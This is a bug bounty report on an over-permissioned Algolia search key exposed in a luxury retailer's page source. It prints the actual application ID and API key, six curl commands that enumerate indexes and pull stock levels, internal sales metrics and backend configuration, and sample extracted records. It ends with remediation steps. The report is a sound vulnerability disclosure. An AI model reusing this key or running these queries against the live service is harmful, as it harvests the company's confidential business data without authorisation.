# Bug Bounty Report: Exposed Algolia API Key Leaking Sensitive Business Data

## Summary

An Algolia API key with `search`, `listIndexes`, and `settings` permissions is exposed in the client-side JavaScript/HTML of `us.louisvuitton.com` (and all country locales). This key provides **unauthenticated access** to the entire product catalog across all regions, including sensitive internal business data such as real-time inventory stock levels, internal conversion metrics, pricing strategy data, and backend service configuration.

---

## Severity: **High**

---

## Affected Asset

- **URL:** `https://us.louisvuitton.com/eng-us/homepage` (and all `[country].louisvuitton.com` locales)
- **Exposed in:** Client-side rendered HTML (SSR payload / page source)
- **Algolia Application ID:** `9B5OL3HHSM`
- **Algolia API Key:** `a2263f2e7f09a315abd6d9855972d585`

---

## Vulnerability Details

The Algolia search API key is embedded in the server-side rendered page source of all `*.louisvuitton.com` country locale sites. While search-only keys are commonly exposed for client-side search functionality, this particular key has **overly permissive access** that exposes sensitive internal business intelligence data that should never be accessible to end users.

### Confirmed Permissions (via `/1/keys/{key}` endpoint):
```json
{
  "value": "a2263f2e7f09a315abd6d9855972d585",
  "acl": ["search", "listIndexes", "settings"],
  "validity": 0
}
```

### What makes this different from a normal search key:
- `listIndexes` — allows enumerating ALL 200+ internal indexes (all locales, test indexes, BFF config, content management rules)
- `settings` — allows reading full index configuration and schema
- No `unretrievableAttributes` configured — ALL internal fields are returned including stock levels, business metrics, and OMS data

---

## Impact — "What Can an Attacker Gain?"

### 1. Real-Time Inventory Intelligence
An attacker can query exact stock levels for all 163,409+ products across every locale. This enables:
- **Targeted scalping/botting** of limited-edition luxury items by monitoring stock counts in real-time
- **Competitor intelligence** — a rival brand can track LV's inventory position globally

**Proof:** 3,259 SKUs returned with exact stock counts. Example: a $15,300 item (`N40853 - LV x Darjeeling Limited Coffret Accessoires`) shows `stockLevel: 1`.

### 2. Internal Business Metrics Exposure
Each product record exposes fields intended only for internal use:

| Field | What It Reveals |
|-------|-----------------|
| `stockLevel` | Exact inventory count per SKU |
| `cfaRate` | Internal conversion-from-add-to-cart rate |
| `digitalConversion` | Digital sales performance metric |
| `turnoverClassification` | Product revenue priority ranking (1-5) |
| `omsAvailability.status` | Real-time Order Management System status |
| `omsAvailability.receivedTime` | OMS data freshness timestamp |
| `priceDetail.currentBeginDate` | Exact date current price took effect |
| `sellableChannels` | Which channels (APP, CSC, RETAIL, WEB) a product sells on |
| `cscSellable` / `cscOrderable` | Client Service Center internal flags |

### 3. Full Infrastructure Enumeration
The `listIndexes` permission reveals:
- All country locale indexes and their sizes (200+ indexes)
- `BFF_CONFIG` — Backend-for-Frontend service configuration (CoreMedia health flags, store config schema)
- `cm-rule` — Content Management merchandising rules for Product Listing Pages
- `neural-sku-*` — AI/ML powered search model indexes
- Internal test indexes (e.g., `sku-en-us-MSR-TEST`)

### 4. Index Settings & Schema Disclosure
Full index configuration is readable including:
- 149 facetable attributes (full internal data model)
- Complete searchable attributes list
- `unretrievableAttributes: None` — confirming nothing is protected
- Replica configuration and neural search setup

---

## Steps to Reproduce

### Step 1: Extract the API key
View page source of `https://us.louisvuitton.com/eng-us/homepage` and search for `apiKey` or `9B5OL3HHSM` in the rendered HTML.

### Step 2: Verify key permissions
```bash
curl -s \
  -H "X-Algolia-API-Key: a2263f2e7f09a315abd6d9855972d585" \
  -H "X-Algolia-Application-Id: 9B5OL3HHSM" \
  "https://9B5OL3HHSM-dsn.algolia.net/1/keys/a2263f2e7f09a315abd6d9855972d585"
```

### Step 3: List all indexes (200+)
```bash
curl -s \
  -H "X-Algolia-API-Key: a2263f2e7f09a315abd6d9855972d585" \
  -H "X-Algolia-Application-Id: 9B5OL3HHSM" \
  "https://9B5OL3HHSM-dsn.algolia.net/1/indexes"
```

### Step 4: Extract sensitive inventory and business data
```bash
curl -s \
  -H "X-Algolia-API-Key: a2263f2e7f09a315abd6d9855972d585" \
  -H "X-Algolia-Application-Id: 9B5OL3HHSM" \
  -H "Content-Type: application/json" \
  -X POST \
  -d '{"query":"","hitsPerPage":5,"filters":"stockLevel > 0 AND price > 10000","attributesToRetrieve":["skuId","displayName","price","stockLevel","cfaRate","digitalConversion","turnoverClassification","omsAvailability"]}' \
  "https://9B5OL3HHSM-dsn.algolia.net/1/indexes/sku-en-us/query"
```

### Step 5: Access internal BFF service configuration
```bash
curl -s \
  -H "X-Algolia-API-Key: a2263f2e7f09a315abd6d9855972d585" \
  -H "X-Algolia-Application-Id: 9B5OL3HHSM" \
  -H "Content-Type: application/json" \
  -X POST \
  -d '{"query":"","hitsPerPage":10}' \
  "https://9B5OL3HHSM-dsn.algolia.net/1/indexes/BFF_CONFIG/query"
```

### Step 6: Read full index settings/schema
```bash
curl -s \
  -H "X-Algolia-API-Key: a2263f2e7f09a315abd6d9855972d585" \
  -H "X-Algolia-Application-Id: 9B5OL3HHSM" \
  "https://9B5OL3HHSM-dsn.algolia.net/1/indexes/sku-en-us/settings"
```

---

## Proof of Exploitation

### Key Permissions Confirmed:
```json
{
  "value": "a2263f2e7f09a315abd6d9855972d585",
  "acl": ["search", "listIndexes", "settings"],
  "validity": 0
}
```

### High-Value Items with Stock Levels Exposed:
```
SKU: N40853 | LV x Darjeeling Limited Coffret Accessoires
  Price: $15,300 | Stock: 1 | Orderable: True
  Turnover Class: 1 | CFA Rate: 0.021 | Digital Conversion: 1.7

SKU: QA5297 | Le Damier de Louis Vuitton Medium Bracelet, White Gold and Diamonds
  Price: $23,100 | Orderable: True
  Turnover Class: 1 | CFA Rate: 0.016 | Digital Conversion: 1.3

SKU: N40932 | Coffret 8 Montres
  Price: $19,000 | Orderable: True
```

### Data Scale:
- **19,607 total SKUs** accessible in US index alone
- **3,259 SKUs** with exact stock level counts exposed
- **3,103 items** priced above $10,000 queryable
- **200+ indexes** enumerable (all locales, all replicas, internal configs)
- **6 BFF_CONFIG entries** exposing backend service configuration

### BFF_CONFIG Sample (Internal Backend Configuration):
```
objectID: cmManualHealthStatus
description: "This flag is used to set coremedia health status manually 
  in order to decouple BFF and Coremedia. During this period, BFF uses 
  backup cm_rules index to fetch PLP rules..."
cmHealthy: True
```

---

## Recommended Remediation

1. **Rotate the Algolia API key immediately**
2. **Remove `listIndexes` and `settings` ACLs** from the public-facing search key
3. **Configure `unretrievableAttributes`** in index settings to hide:
   - `stockLevel`
   - `cfaRate`
   - `digitalConversion`
   - `turnoverClassification`
   - `omsAvailability`
   - `priceDetail`
   - `sellableChannels`
   - `cscSellable` / `cscOrderable`
4. **Move `BFF_CONFIG` to a restricted key** — this index should not be queryable by the public search key
5. **Restrict index access** — the public key should only access the user's current locale index, not all 200+

---

## Classification

- **Vulnerability Type:** Exposed secrets, credentials or sensitive information on an asset under our control and affecting at least one of our scopes
- **CWE-200:** Exposure of Sensitive Information to an Unauthorized Actor
- **CWE-312:** Cleartext Storage of Sensitive Information

---

**Tested with User-Agent suffix:** `lvm-ywh-pbb`
